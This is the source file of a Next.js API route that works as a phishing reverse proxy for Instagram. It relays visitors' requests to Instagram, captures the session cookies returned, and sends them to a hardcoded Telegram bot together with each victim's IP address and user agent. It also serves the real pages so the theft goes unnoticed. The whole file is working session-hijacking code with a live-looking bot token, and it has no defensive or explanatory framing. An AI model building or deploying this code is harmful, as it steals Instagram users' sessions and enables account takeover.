// pages/api/proxy.js

export const config = {
  api: {
    bodyParser: false,
  },
};

export default async function handler(req, res) {
  // ✅ CONFIGURATION
  const BOT_TOKEN = "8976721119:AAFh2XQKD_95hHATbpegFn0iToWO_W92-xE";
  const CHAT_ID = "8569746095";
  
  // ✅ Mobile User-Agent
  const MOBILE_UA = "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1";

  // ✅ Client Info
  const clientIP = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "Unknown";
  const clientUA = req.headers["user-agent"] || "Unknown";

  try {
    const https = require("https");
    
    // ✅ Build the request to Instagram
    const options = {
      hostname: "www.instagram.com",
      path: req.url, 
      method: req.method,
      headers: {
        "User-Agent": MOBILE_UA,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Cookie": req.headers.cookie || "", 
      },
    };

    const request = https.request(options, (response) => {
      // ✅ 1. Get Cookies from Instagram's response
      const cookies = response.headers["set-cookie"] || [];
      
      // ✅ 2. Prepare Telegram Message
      const timestamp = new Date().toISOString();
      const cookieList = cookies
        .map((c) => c.split(";")[0])
        .join("\n");

      const message = `
🍪 <b>Instagram Session Logged!</b>

🕒 <b>Time:</b> ${timestamp}
🌐 <b>IP:</b> ${clientIP}
📱 <b>UA:</b> <code>${clientUA}</code>
🔗 <b>Path:</b> ${req.url}

🍪 <b>Cookies Captured:</b>
<code>${cookieList}</code>
      `;

      // ✅ 3. Send to Telegram
      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
          parse_mode: "HTML",
        }),
      })
        .then((response) => response.json())
        .then((data) => {
          if (data.ok) {
            console.log("✅ Telegram message sent!");
          } else {
            console.error("❌ Telegram API Error:", data);
          }
        })
        .catch((err) => console.error("❌ Fetch Error:", err));

      // ✅ 4. Stream the response to the user
      res.statusCode = response.statusCode;
      
      if (cookies.length > 0) {
        res.setHeader("Set-Cookie", cookies);
      }
      
      if (response.headers["content-type"]) {
        res.setHeader("Content-Type", response.headers["content-type"] || "text/html");
      }

      response.pipe(res);
    });

    request.on("error", (e) => {
      console.error("Proxy Error:", e);
      res.status(500).end("Error");
    });

    request.end();

  } catch (error) {
    console.error("Server Error:", error);
    res.status(500).end("Server Error");
  }
}


